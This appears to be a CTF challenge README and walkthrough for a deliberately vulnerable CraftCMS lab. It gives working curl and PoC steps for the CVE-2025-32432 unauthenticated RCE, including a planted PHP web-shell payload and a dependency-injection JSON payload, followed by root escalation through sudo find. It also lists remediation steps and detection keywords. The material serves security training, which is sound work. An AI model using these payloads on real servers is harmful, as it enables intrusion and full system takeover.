# CraftCMS CVE-2025-32432 Challenge

**Status:** ✅ Complete

## Player Description

Welcome to EverSec's Brand Portal! We recently migrated to CraftCMS 5.6.16 because our marketing team loves the image transformation features. They can resize, crop, and transform images on-the-fly without bothering IT! Sure, there was a security advisory about some "dependency injection vulnerability" but our CTO said "we don't even use dependency injection, so we're fine!" Besides, updating would require testing and we're too busy building features. What could possibly go wrong with a feature that transforms user-uploaded images?

## Technical Description

**Challenge Information:**
- **Name**: CraftCMS RCE (CVE-2025-32432)
- **Category**: Web / Real CVE Exploitation / Privilege Escalation
- **Difficulty**: Hard
- **Points**: 900 (2 flags total)
- **Port**: 4019
- **Author**: EverSec CTF Team

EverSec runs a brand portal powered by CraftCMS 5.6.16. The security team hasn't applied the latest patches. Can you exploit a known vulnerability to compromise the server and escalate privileges?

**Objective**: Exploit CVE-2025-32432 (unauthenticated RCE) to gain initial access, then escalate to root for full system compromise.

## Flags

- **FLAG 1** (400 points): Exploit CVE-2025-32432 to achieve RCE and read `/var/www/flag1.txt`
- **FLAG 2** (500 points): Escalate privileges to root and read `/flag.txt`

## Setup Instructions

### Using Docker Compose (Recommended)

```bash
# Build and start the challenge
cd Challenges/xray-craftcms-rce
docker compose up -d

# View logs
docker compose logs -f

# Stop the challenge
docker compose down
```

### From Project Root

```bash
# Add to main docker-compose.yml first, then:
docker compose up -d xray-craftcms-rce
```

### Local Testing

Navigate to `http://localhost:4019`

### ⏱️ First-Boot Note

On first boot, the entrypoint automatically runs the CraftCMS installer and seeds a test asset (required by the exploit). This takes **2–4 minutes** on first run (MySQL must be ready, then Composer installs, then Craft installs). The container will return HTTP 503 until installation completes. Health check polling handles this gracefully — just wait for the site to return 200 before exploiting.

## Learning Objectives

After completing this challenge, participants will understand:

1. **Real CVE Exploitation**: Hands-on experience with CVE-2025-32432, a critical CraftCMS vulnerability
2. **Yii Framework Exploitation**: How dependency injection containers can be exploited
3. **Session Poisoning**: Techniques for injecting malicious payloads into session files
4. **Two-Stage Attacks**: Chaining multiple requests to achieve code execution
5. **Privilege Escalation**: Exploiting sudo misconfigurations to gain root access
6. **GTFOBins Techniques**: Using legitimate binaries for privilege escalation

## Vulnerability Background

### CVE-2025-32432 (CraftCMS Unauthenticated RCE)

**CVE-2025-32432** is an unauthenticated remote code execution vulnerability in CraftCMS's image transformation feature.

**CVSS Score**: 9.8 (Critical)

**Affected Versions**:
- CraftCMS 3.x: 3.0.0-RC1 to 3.9.14
- CraftCMS 4.x: 4.0.0-RC1 to 4.14.14
- CraftCMS 5.x: 5.0.0-RC1 to 5.6.16

**Vulnerable Endpoint**: `/actions/assets/generate-transform`

**Root Cause**: The vulnerability exists due to insufficient validation of user input in CraftCMS's image transformation API. Attackers can exploit Yii framework's dependency injection container by manipulating the `__class` parameter in the request payload. This allows instantiation of arbitrary classes with controlled constructor parameters.

**Impact**: Unauthenticated remote code execution, complete server compromise, data theft, lateral movement.

## Solution

### Phase 1: Reconnaissance

1. **Identify the Target**:
```bash
curl http://localhost:4019
```

2. **Identify CraftCMS Version**:
Check the admin login page or HTML source:
```bash
curl -s http://localhost:4019 | grep -i craft
```

You should identify CraftCMS 5.6.16, which is vulnerable to CVE-2025-32432.

3. **Verify Installation**:
Ensure CraftCMS is installed (not showing installation wizard):
```bash
curl -s http://localhost:4019/admin/login
```

### Phase 2: Understanding the Vulnerability

CVE-2025-32432 is a **two-packet chain attack**:

#### Packet 1: Session Poisoning
- Send a GET request with malicious PHP code in a parameter
- CraftCMS writes this to the session file at `/tmp/sess_{sessionid}`
- Extract the CSRF token and session ID for the next step

#### Packet 2: Code Execution
- Send a POST request to `/actions/assets/generate-transform`
- Exploit Yii's dependency injection by setting `__class` to `yii\rbac\PhpManager`
- Point `itemFile` constructor parameter to the poisoned session file
- `PhpManager` includes and executes the session file containing your PHP code

### Phase 3: Exploitation - FLAG 1 (RCE)

#### Method 1: Using the Included POC Script (Recommended)

The challenge includes a Python POC script based on the public exploit:

```bash
cd Challenges/xray-craftcms-rce/exploit
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "whoami"
```

**Test RCE**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "id"
```

**Get FLAG 1**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "cat /var/www/flag1.txt"
```

Expected output:
```
cr4ftcms_rc3_v14_xx3
```

#### Method 2: Manual Exploitation with curl

**Step 1: Session Poisoning**

```bash
# Craft the PHP payload (will be written to session file)
PHP_PAYLOAD='<?=shell_exec($_GET["cmd"]);exit;?>'

# Send GET request to poison session file
curl -s "http://localhost:4019/index.php?p=admin/dashboard&cve202532432=${PHP_PAYLOAD}" \
  -c cookies.txt \
  -o response1.html

# Extract CSRF token from response
CSRF_TOKEN=$(grep -oP 'name="CRAFT_CSRF_TOKEN" value="\K[^"]+' response1.html | head -1)

# Extract session ID from cookie
SESSION_ID=$(grep -oP 'CraftSessionId\s+\K[a-f0-9]+' cookies.txt)

echo "CSRF Token: $CSRF_TOKEN"
echo "Session ID: $SESSION_ID"
```

**Step 2: Trigger Code Execution**

```bash
# Prepare the exploit payload
cat > exploit.json << EOF
{
  "assetId": 1,
  "handle": {
    "width": 1,
    "height": 1,
    "as hack": {
      "class": "craft\\\\behaviors\\\\FieldLayoutBehavior",
      "__class": "yii\\\\rbac\\\\PhpManager",
      "__construct()": [{
        "itemFile": "/tmp/sess_${SESSION_ID}"
      }]
    }
  }
}
EOF

# Execute command (read FLAG 1)
curl -s -X POST "http://localhost:4019/index.php?p=actions/assets/generate-transform&cmd=cat%20/var/www/flag1.txt" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: ${CSRF_TOKEN}" \
  -b cookies.txt \
  -d @exploit.json
```

The flag will appear in the response before the JSON data.

#### Method 3: Using Public Exploits

Download the public POC from security researchers:

```bash
# Clone or download the exploit
wget https://raw.githubusercontent.com/vulhub/vulhub/master/craftcms/CVE-2025-32432/poc.py

# Run the exploit
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "cat /var/www/flag1.txt"
```

### Phase 4: Privilege Escalation - FLAG 2 (Root Access)

Once you have RCE as www-data, you need to escalate to root.

#### Step 1: Enumerate Privilege Escalation Vectors

**Check sudo permissions**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo -l"
```

Expected output:
```
User www-data may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/find
```

This reveals that www-data can run `/usr/bin/find` as root without a password!

#### Step 2: Exploit sudo + find for Privilege Escalation

The `find` command can be abused for privilege escalation using GTFOBins techniques.

**Method 1: Execute commands as root**

```bash
# Use find's -exec flag to execute commands as root
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo find /flag.txt -exec cat {} \;"
```

Expected output:
```
r00t_pr1v3sc_4ch13v3d
```

**Method 2: Read flag using find's file operations**

```bash
# Use find to read the file directly
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo find /flag.txt -type f -exec cat {} +"
```

**Method 3: Get a root shell (if needed)**

```bash
# Use find to spawn a root shell
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo find /etc/passwd -exec /bin/sh \;"
```

Then execute commands:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "whoami"  # Should show 'root'
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "cat /flag.txt"
```

### Phase 5: Alternative Privilege Escalation Techniques

If `find` wasn't available, here are other enumeration steps:

1. **Check for SUID binaries**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "find / -perm -4000 2>/dev/null"
```

2. **Check writable files**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "find / -writable -type f 2>/dev/null | grep -v proc"
```

3. **Check kernel version** (for kernel exploits):
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "uname -a"
```

4. **Check for Docker socket** (container escape):
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "ls -la /var/run/docker.sock"
```

## Complete Walkthrough

**Full attack chain from start to finish**:

```bash
# 1. Wait for CraftCMS to finish auto-installing (~2-4 min on first boot)
until curl -sf http://localhost:4019/ > /dev/null; do echo "Waiting..."; sleep 5; done && echo "Ready"

# 2. Use the included PoC
cd Challenges/xray-craftcms-rce/exploit

# 3. Test RCE
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "id"

# 4. Get FLAG 1 (RCE)
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "cat /var/www/flag1.txt"
# Output: cr4ftcms_rc3_v14_xx3

# 5. Enumerate privileges
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo -l"

# 6. Get FLAG 2 (Root)
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo find /flag.txt -exec cat {} \;"
# Output: r00t_pr1v3sc_4ch13v3d
```

## Common Pitfalls

1. **First-Boot Delay**: Installation is automated but takes 2–4 minutes on first run (MySQL + Composer + Craft install). The site returns HTTP 503 until done. Wait for a 200 before exploiting.
2. **assetId on 5.x is forgiving**: On CraftCMS 4.x/5.x, asset validation happens *after* the transform object is created, so the DI chain fires before the asset lookup — meaning `assetId: 0` (the public PoC default) typically works. A test image is also pre-seeded as `assetId: 1` via `seed_asset.php` as a guaranteed fallback if you encounter issues.
3. **Session ID Extraction**: Must correctly extract the session ID from cookies or the session cookie name.
4. **CSRF Token**: Must extract the CSRF token from the initial request for the exploit to work.
5. **JSON Escaping**: The `__class` parameter requires proper escaping of backslashes in JSON.
6. **Command Encoding**: Commands with special characters must be URL-encoded in the GET parameter.
7. **MySQL Connection**: Ensure the MySQL container is healthy before accessing CraftCMS.
8. **sudo -l Output**: The exploit is non-interactive, so you can't run commands that require a TTY.
9. **Find Syntax**: The `-exec` flag requires proper syntax: `find [path] -exec [command] {} \;`

## Defense and Remediation

### How to Prevent This Vulnerability

1. **Update CraftCMS Immediately**:
   - CraftCMS 3.x: Update to 3.9.15 or higher
   - CraftCMS 4.x: Update to 4.14.15 or higher
   - CraftCMS 5.x: Update to 5.6.17 or higher

2. **Input Validation**:
   - Sanitize all user inputs before processing
   - Implement whitelist validation for class names in dependency injection
   - Prevent `__class` and `__construct()` in user-controlled data

3. **Session Security**:
   - Store session files outside web root
   - Encrypt session data
   - Implement session file integrity checks

4. **Principle of Least Privilege**:
   - Web server user (www-data) should NOT have sudo permissions
   - Review and audit all sudoers configurations
   - Remove NOPASSWD entries unless absolutely necessary
   - Use limited sudo permissions with specific command restrictions

5. **Web Application Firewall (WAF)**:
   - Deploy WAF rules to detect CVE-2025-32432 exploitation attempts
   - Block requests with suspicious `__class` parameters
   - Monitor for unusual POST requests to `/actions/assets/generate-transform`

6. **Monitoring and Detection**:
   - Monitor POST requests to `/actions/assets/generate-transform` endpoint
   - Alert on requests containing `__class`, `__construct()`, or `PhpManager`
   - Log all API endpoint access for forensic analysis
   - Monitor sudo usage and alert on unexpected executions

### CraftCMS's Patch

The official patch (5.6.17+) added validation to prevent malicious class instantiation:

```php
// Simplified version of the fix
function validateTransformHandle($handle) {
    // Whitelist allowed parameters
    $allowedKeys = ['width', 'height', 'mode', 'position', 'quality'];

    foreach ($handle as $key => $value) {
        // Block dangerous parameters
        if (str_starts_with($key, '__') || $key === 'class') {
            throw new InvalidArgumentException("Invalid parameter: $key");
        }

        // Recursively validate nested arrays
        if (is_array($value)) {
            validateTransformHandle($value);
        }
    }
}
```

### Sudo Misconfiguration Fix

Remove the dangerous sudo permission:

```bash
# Remove the vulnerable entry from /etc/sudoers
# DELETE: www-data ALL=(root) NOPASSWD: /usr/bin/find

# Or use visudo to edit safely
sudo visudo
```

**Better approach**: If www-data needs specific privileges, use a wrapper script with limited functionality instead of granting sudo access to powerful binaries like `find`.

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Identify the CraftCMS version and research CVE-2025-32432. It's a pre-authentication vulnerability — public exploit scripts exist. What does the CVE allow an unauthenticated attacker to do?

</details>

<details>
<summary>Hint 2</summary>

Once you have a foothold, think about what a web application typically stores in its configuration. What credentials or paths might open up further access?

</details>

## References

- [CraftCMS Official Advisory CVE-2025-32432](https://craftcms.com/knowledge-base/craft-cms-cve-2025-32432)
- [OPSWAT CVE-2025-32432 Analysis](https://www.opswat.com/blog/cve-2025-32432-unauthenticated-remote-code-execution-in-craft-cms)
- [Vulhub CraftCMS CVE-2025-32432 Environment](https://github.com/vulhub/vulhub/tree/master/craftcms/CVE-2025-32432)
- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
- [Yii Framework Dependency Injection](https://www.yiiframework.com/doc/guide/2.0/en/concept-di-container)

## Challenge Tags

`CVE`, `RCE`, `CraftCMS`, `Yii Framework`, `Session Poisoning`, `Privilege Escalation`, `sudo`, `GTFOBins`, `Real Vulnerability`, `Critical`

---

**EverSec Security Solutions** | Cackalacky Con 2026 CTF
